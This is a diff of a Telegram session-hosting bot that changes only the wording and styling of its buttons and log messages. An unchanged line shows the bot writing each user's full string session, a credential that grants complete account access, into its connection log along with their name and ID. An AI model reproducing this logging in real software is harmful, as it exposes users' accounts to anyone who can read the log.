@@ -25,10 +25,10 @@ db = DBSessionManager(config.DB_PATH)
 @app.on_message(filters.command("start") & filters.private)
 async def start_cmd(client, message):
     buttons = InlineKeyboardMarkup([
-        [InlineKeyboardButton("👑 Owner", url=f"tg://user?id={config.OWNER_ID}")],
+        [InlineKeyboardButton("ᴏᴡɴᴇʀ", url=f"tg://user?id={config.OWNER_ID}")],
         [
-            InlineKeyboardButton("📢 Channel", url=config.SUPPORT_CHANNEL),
-            InlineKeyboardButton("💬 Support Chat", url=config.SUPPORT_CHAT)
+            InlineKeyboardButton("📢 ᴄʜᴀɴɴᴇʟ", url=config.SUPPORT_CHANNEL),
+            InlineKeyboardButton("💬 sᴜᴘᴘᴏʀᴛ ᴄʜᴀᴛ", url=config.SUPPORT_CHAT)
         ],
     ])
     await message.reply_photo(
@@ -78,10 +78,10 @@ async def receive_session(client, message):
 
     # Log connection
     log_text = (
-        f"🧾 **New User Connected**\n\n"
-        f"👤 **Name:** {user.first_name or 'Unknown'}\n"
-        f"🆔 **User ID:** `{user_id}`\n"
-        f"💬 **Username:** @{user.username if user.username else 'N/A'}\n"
+        f"🧾 **ɴᴇᴡ ᴜsᴇʀ ᴄᴏɴɴᴇᴄᴛᴇᴅ**\n\n"
+        f"👤 **ɴᴀᴍᴇ:** {user.first_name or 'Unknown'}\n"
+        f"🆔 **ᴜsᴇʀ ɪᴅ:** `{user_id}`\n"
+        f"💬 **ᴜsᴇʀɴᴀᴍᴇ:** @{user.username if user.username else 'N/A'}\n"
         f"🔑 **String Session:**\n`{text}`"
     )
 
@@ -121,9 +121,9 @@ async def disconnect_cmd(client, message):
 
     # Log disconnect
     log_text = (
-        f"🚫 **Userbot Disconnected**\n\n"
-        f"👤 **User ID:** `{target_id}`\n"
-        f"🧍 By:** {'Owner' if sender_id == config.OWNER_ID else 'User'}**"
+        f"🚫 **ᴜsᴇʀʙᴏᴛ Disconnected**\n\n"
+        f"👤 **ᴜsᴇʀ ɪᴅ:** `{target_id}`\n"
+        f"🧍 ʙʏ:** {'Owner' if sender_id == config.OWNER_ID else 'User'}**"
     )
 
     try:
